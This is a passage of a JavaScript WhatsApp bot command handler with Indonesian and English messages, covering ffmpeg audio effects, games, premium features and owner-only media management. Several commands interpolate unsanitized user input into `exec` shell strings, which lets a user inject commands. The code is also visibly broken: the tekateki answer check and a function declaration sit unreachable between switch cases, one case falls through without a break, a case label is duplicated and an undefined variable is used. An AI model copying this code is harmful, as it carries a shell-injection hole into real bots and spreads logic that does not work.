   let medi = fs.readFileSync('./' + buff)
  await XeonBotInc.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'volaudio': {
if (!args.join(" ")) return replygcxeon(`Example: ${prefix + command} 10`)
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
XeonBotInc.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return replygcxeon(`Example: ${prefix + command} 10`)
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
XeonBotInc.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
  case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await XeonStickWait()
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcxeon(err)
                let buff = fs.readFileSync(ran)
                XeonBotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcxeon(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcxeon(e)
                }
                break
                //media db
  case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygcxeon(teks)
}
break

            //game
            case 'ttc':
    case 'ttt':
    case 'tictactoe': {
        let TicTacToe = require("./lib/tictactoe")
        this.game = this.game ? this.game : {}
        if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcxeon('Kamu masih dalam permainan')
        let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
        if (room) {
            replygcxeon('Pasangan tidak ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            let str = `ID Ruangan: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Tunggu @${room.game.currentTurn.split('@')[0]}

Ketik *surrender* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await XeonBotInc.sendText(room.x, str, m, {
                mentions: parseMention(str)
            })
            await XeonBotInc.sendText(room.o, str, m, {
                mentions: parseMention(str)
            })
        } else {
            room = {
                id: 'tictactoe-' + (+new Date),
                x: m.chat,
                o: '',
                game: new TicTacToe(m.sender, 'o'),
                state: 'WAITING'
            }
            if (text) room.name = text
            replygcxeon('Menunggu pasangan' + (text ? ` ketik perintah di bawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
        }
    }
    break



this.game = this.game || {};  // Pastikan objek game ada

case 'tekateki': { 
    // Cek apakah ada teka-teki yang belum dijawab oleh pengguna
    if (this.game?.[m.sender.split('@')[0]]) { 
        return replygcxeon('Masih ada teka-teki yang belum kamu jawab!');
    }

    // Ambil soal secara acak
    let randomQuestion = questions[Math.floor(Math.random() * questions.length)];  // Ambil soal acak dari questions
    let { question, answer } = randomQuestion;
    let timeLimit = 60 * 1000; // 60 detik dalam ms
    let tries = 3;  // Maksimal percobaan jawaban

    // Kirim pertanyaan ke pengguna
    XeonBotInc.sendText(m.chat, `*Teka-Teki*\n\n*Pertanyaan:* ${question}\nWaktu: 60 detik\n\nKetik jawabanmu sekarang!`, m);

    // Simpan jawaban dan informasi permainan di objek this.game
    this.game[m.sender.split('@')[0]] = { answer: answer.toLowerCase(), tries: tries, timeLimit: timeLimit, timeout: null };

    // Timer habis, jika waktu habis, game selesai
    this.game[m.sender.split('@')[0]].timeout = setTimeout(() => {
        if (this.game[m.sender.split('@')[0]]) {
            replygcxeon(`*Waktu habis!*\nJawabannya adalah: *${answer}*`);
            delete this.game[m.sender.split('@')[0]];  // Hapus game setelah selesai
        }
    }, timeLimit);

} break;

// Cek jawaban untuk teka-teki
if (this.game?.[m.sender.split('@')[0]]) { 
    if (m.key.fromMe) return;  // Cegah balasan dari bot itu sendiri

    let playerData = this.game[m.sender.split('@')[0]];
    let jawaban = playerData.answer;
    let userAnswer = m.text ? m.text.toLowerCase() : '';  // Pastikan m.text berisi jawaban yang dikirimkan

    console.log('Jawaban pengguna:', userAnswer);  // Debugging: Log jawaban pengguna
    console.log('Jawaban yang benar:', jawaban);   // Debugging: Log jawaban yang benar

    if (!userAnswer) {
        console.log('Jawaban pengguna kosong!');  // Debugging: Log jika jawaban kosong
        return;  // Jika tidak ada jawaban, tidak perlu melanjutkan
    }

    // Cek apakah jawaban benar
    if (userAnswer === jawaban) {
        console.log('Jawaban benar!');  // Debugging: Log ketika jawaban benar
        clearTimeout(playerData.timeout);  // Hapus timeout jika jawab benar
        await XeonBotInc.sendText(m.chat, ` Teka-Teki \n\nCorrect Answer \n\nWant To Play Again? Send *${prefix}tekateki*`, m);
        delete this.game[m.sender.split('@')[0]];  // Hapus game setelah selesai
    } else {
        // Jika jawaban salah, beri tahu pemain
        console.log('Jawaban salah!');  // Debugging: Log jika jawaban salah
        await XeonBotInc.sendText(m.chat, `*Wrong Answer!*`, m);
    }
} break;

// Petunjuk (Hint)
case 'hint': {
    if (this.game?.[m.sender.split('@')[0]]) {
        let playerData = this.game[m.sender.split('@')[0]];
        let hint = getHint(playerData.answer);  // Fungsi untuk memberikan hint
        replygcxeon(`*Hint:* ${hint}`);
    } else {
        replygcxeon("Tidak ada permainan teka-teki yang sedang berlangsung.");
    }
}
break;

// Fungsi untuk memberikan hint
function getHint(answer) {
    // Logika untuk membuat hint berdasarkan panjang kata dan huruf pertama
    return `Jawaban dimulai dengan huruf *${answer.charAt(0)}* dan memiliki *${answer.length}* huruf.`;
}

            case 'delttc':
            case 'delttt': {
                this.game = this.game ? this.game : {}
                try {
                    if (this.game) {
                        delete this.game
                        XeonBotInc.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
                    } else if (!this.game) {
                        replygcxeon(`Session TicTacToe🎮 tidak ada`)
                    } else mewReply('?')
                } catch (e) {
                    replygcxeon('rusak')
                }
            }
            break
            case 'suitpvp':
    case 'suit': {
        this.suit = this.suit ? this.suit : {}
        let poin = 10
        let poin_lose = 10
        let timeout = 60000
        if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcxeon(`Selesaikan suit sebelumnya`)
        if (m.mentionedJid[0] === m.sender) return replygcxeon(`Tidak bisa bermain dengan diri sendiri!`)
        if (!m.mentionedJid[0]) return replygcxeon(`_Siapa yang ingin kamu tantang?_ \nTandai orang tersebut..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, {
            mentions: [owner[1] + '@s.whatsapp.net']
        })
        if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcxeon(`Orang yang kamu tantang sedang bermain suit dengan orang lain :(`)
        let id = 'suit_' + new Date() * 1
        let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silakan @${m.mentionedJid[0].split`@`[0]} untuk mengetik terima/tolak`
        this.suit[id] = {
            chat: await XeonBotInc.sendText(m.chat, caption, m, {
                mentions: parseMention(caption)
            }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
                if (this.suit[id]) XeonBotInc.sendText(m.chat, `_Waktu suit sudah habis_`, m)
                delete this.suit[id]
            }, 60000),
            poin,
            poin_lose,
            timeout
        }
    }
    break
            case 'mathquiz':
case 'math': {
    let { genMath, modes } = require('./lib/math')
    if (!text) return replygcxeon(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)

    try {
        let result = await genMath(text.toLowerCase())
        XeonBotInc.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
            kuismath[m.sender.split('@')[0]] = result.jawaban
        })
        await sleep(result.waktu)
        if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
            replygcxeon("Waktu habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
            delete kuismath[m.sender.split('@')[0]]
        }
    } catch (e) {
        replygcxeon(e.message)
    }
}
break
            case 'afk': {
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`)

    let user = global.db.data.users[m.sender]
    user.afkTime = + new Date
    user.afkReason = text
    replygcxeon(`${m.pushName} *SEDANG AFK KARENA*${text ? ': ' + text : ''}`)
            }
            break
            case 'ai': 
            case 'ask':
            case 'openai': {
               if (db.data.users[sender].limit < 1) return replygcxeon(mess.limit)
	            if (!q) return replygcxeon(`Example : ${prefix + command} who is ronaldo`)
			      var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
			      var isi = isiai.result
		         await replygcxeon(isi)
			   }
			   break
    case 'xxqc': {
if (!q) return replygcxeon(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return replygcxeon(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return replygcxeon('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await XeonBotInc.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
XeonBotInc.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break
    case 'ephemeral': {
                if (!m.isGroup) return XeonStickGroup()
                if (!isBotAdmins) return XeonStickBotAdmin()
                if (!isAdmins) return XeonStickAdmin()
                if (!text) return replygcxeon('Enter the value enable/disable')
                if (args[0] === 'on') {
                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
                    await replygcxeon(`Done`)
                } else if (args[0] === 'off') {
                    await XeonBotInc.sendMessage(m.chat, { disappearingMessagesInChat: false })
                    await replygcxeon(`Done`)
                }
            }
            break
            case 'delete': case 'del': case 'd': {
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`)

    let key = {}
    try {
        key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
        key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
        key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
        key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
    } catch (e) {
        console.error(e)
    }
    XeonBotInc.sendMessage(m.chat, { delete: key })
}
break
    case 'autoswview':
    case 'autostatusview':{
             if (!XeonTheCreator) return XeonStickOwner()
               if (args.length < 1) return replygcxeon('on/off?')
               if (args[0] === 'on') {
                  antiswview = true
                  replygcxeon(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  antiswview = false
                  replygcxeon(`${command} is disabled`)
               }
            }
            break
    case 'anticall': {
    if (!XeonTheCreator) return XeonStickOwner()
    if (args.length < 1) return replygcxeon('Gunakan: anticall on/off')
    if (args[0] === 'on') {
        global.anticall = true
        replygcxeon(`Anti-call telah *diaktifkan*`)
    } else if (args[0] === 'off') {
        global.anticall = false
        replygcxeon(`Anti-call telah *dinonaktifkan*`)
    } else {
        replygcxeon('Pilihan tidak valid! Gunakan "on" atau "off"')
    }
}
break
case 'addvideo':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the video name?')
if (VideoXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
VideoXeon.push(q)
await fsx.copy(delb, `./XeonMedia/video/${q}.mp4`)
fs.writeFileSync('./XeonMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the video name')
if (!VideoXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = VideoXeon.indexOf(q)
VideoXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(`./XeonMedia/video/${q}.mp4`)
replygcxeon(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoXeon.length}*`
replygcxeon(teks)
}
break
case 'addimage':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the image name?')
if (ImageXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ImageXeon.push(q)
await fsx.copy(delb, `./XeonMedia/image/${q}.jpg`)
fs.writeFileSync('./XeonMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the image name')
if (!ImageXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = ImageXeon.indexOf(q)
ImageXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonimage.json', JSON.stringify(ImageXeon))
fs.unlinkSync(`./XeonMedia/image/${q}.jpg`)
replygcxeon(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of ImageXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${ImageXeon.length}*`
replygcxeon(teks)
}
break
case 'addsticker':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the sticker name?')
if (StickerXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
StickerXeon.push(q)
await fsx.copy(delb, `./XeonMedia/sticker/${q}.webp`)
fs.writeFileSync('./XeonMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the sticker name')
if (!StickerXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = StickerXeon.indexOf(q)
StickerXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonsticker.json', JSON.stringify(StickerXeon))
fs.unlinkSync(`./XeonMedia/sticker/${q}.webp`)
replygcxeon(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StickerXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StickerXeon.length}*`
replygcxeon(teks)
}
break

case 'addvn':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Whats the audio name?')
if (VoiceNoteXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
VoiceNoteXeon.push(q)
await fsx.copy(delb, `./XeonMedia/audio/${q}.mp3`)
fs.writeFileSync('./XeonMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!XeonTheCreator) return XeonStickOwner()
if (args.length < 1) return replygcxeon('Enter the vn name')
if (!VoiceNoteXeon.includes(q)) return replygcxeon("The name does not exist in the database")
let wanu = VoiceNoteXeon.indexOf(q)
VoiceNoteXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/xeonvn.json', JSON.stringify(VoiceNoteXeon))
fs.unlinkSync(`./XeonMedia/audio/${q}.mp3`)
replygcxeon(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNoteXeon) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNoteXeon.length}*`
replygcxeon(teks)
}
break
case 'addzip':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./XeonMedia/zip/${teks}.zip`)
fs.writeFileSync('./XeonMedia/database/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./XeonMedia/zip/${teks}.zip`)
replygcxeon(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {

let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replygcxeon(teksooooo)
}
break
case 'addapk':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./XeonMedia/apk/${teks}.apk`)
fs.writeFileSync('./XeonMedia/database/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replygcxeon(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./XeonMedia/apk/${teks}.apk`)
replygcxeon(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {

let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replygcxeon(teksoooooo)
}
break
case 'addpdf':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
DocXeon.push(teks)
await fsx.copy(delb, `./XeonMedia/doc/${teks}.pdf`)
fs.writeFileSync('./XeonMedia/database/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replygcxeon(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!XeonTheCreator) return XeonStickOwner()

if (args.length < 1) return replygcxeon('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = DocXeon.indexOf(teks)
DocXeon.splice(wanu, 1)
fs.writeFileSync('./XeonMedia/database/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./XeonMedia/doc/${teks}.pdf`)
replygcxeon(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {

let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of DocXeon) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${DocXeon.length}*`
replygcxeon(teksoooo)
}
break
case command.match(/^sound(1[0-5]?[0-9]|[1-9][0-9]?|160|161)$/)?.input:
    if (!isPremium) return replygcxeon(`*MAAF, FITUR INI KHUSUS UNTUK MEMBER PREMIUM*

*SILAHKAN HUBUNGI ADMIN UNTUK MENDAFTAR SEBAGAI MEMBER PREMIUM*
*BIAYANYA 10 RIBU PER BULAN*`);

    try {
        const XeonBotInc_dev = await getBuffer(`https://github.com/ismailmarzuky/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`);

        if (!XeonBotInc_dev) {
            reply('Error: Gagal mengambil file audio.');
            return;
        }

        await XeonBotInc.sendMessage(m.chat, { 
            audio: XeonBotInc_dev, 
            mimetype: 'audio/mpeg',
            ptt: true 
        }, { quoted: m });

    } catch (err) {
        console.error('Error saat mengirim audio:', err);
        reply('Terjadi kesalahan saat mengirim audio.');
    }
    break;
    

case 'islami': { const groupTarget = '120363381650629890@g.us'

async function checkUserInGroup(sender) {
    try {
        const groupMetadata = await XeonBotInc.groupMetadata(groupTarget)
        const participants = groupMetadata.participants.map(p => p.id)
        const senderJid = sender.endsWith('@s.whatsapp.net') ? sender : sender + '@s.whatsapp.net'
        return participants.includes(senderJid)
    } catch (err) {
        console.log('Gagal mendapatkan metadata grup:', err.message)
        return false
    }
}

if (!(await checkUserInGroup(m.sender))) {
    await XeonBotInc.sendMessage(m.chat, {
        text: '*Maaf, sepertinya kamu belum masuk ke dalam grup.*\n*Silakan masuk ke grup terlebih dahulu sebelum mengambil sticker.*\n\nLink Grup:\nhttps://chat.whatsapp.com/Iv3jpjyVZ2bFGNYVD6C6sD'
    }, { quoted: m })
    break
}

const totalStickers = 60
const historyFile = './used_islami.json'

let used = []
if (fs.existsSync(historyFile)) {
    try {
        used = JSON.parse(fs.readFileSync(historyFile))
    } catch (e) {
        used = []
    }
}

if (used.length >= totalStickers) used = []

const allNumbers = [...Array(totalStickers)].map((_, i) => i + 1)
const remaining = allNumbers.filter(n => !used.includes(n))
const randomNumber = remaining[Math.floor(Math.random() * remaining.length)]
const fileName = `A${randomNumber}.webp`

// Jika sudah pernah dikirim, langsung forward
if (forwardedIslami[fileName]) {
    try {
        const { remoteJid, id, message } = forwardedIslami[fileName]
        await XeonBotInc.sendMessage(m.chat, {
            forward: { key: { remoteJid, id }, message }
        }, { quoted: m })
        break
    } catch (e) {
        console.log('Gagal forward, fallback ke fetch:', e)
    }
}

const stickerUrl = `https://raw.githubusercontent.com/greenzombies1/sticker/main/islami/${fileName}`

try {
    const buffer = await (await fetch(stickerUrl)).buffer()
    const sentMsg = await XeonBotInc.sendMessage(m.chat, { sticker: buffer }, { quoted: m })

    // Cache untuk forwarding
    forwardedIslami[fileName] = {
        remoteJid: m.chat,
        id: sentMsg.key.id,
        message: sentMsg.message
    }
    saveForwardedIslami()

    used.push(randomNumber)
    fs.writeFileSync(historyFile, JSON.stringify(used))
} catch (err) {
    console.error(`Gagal mengirim stiker Islami: ${fileName}`, err)
    m.reply(`Maaf, stiker *${fileName}* gagal dikirim. Coba lagi!`)
}
break

}


case 'jomok': {
    const groupTarget = '120363381650629890@g.us'

    async function checkUserInGroup(sender) {
        try {
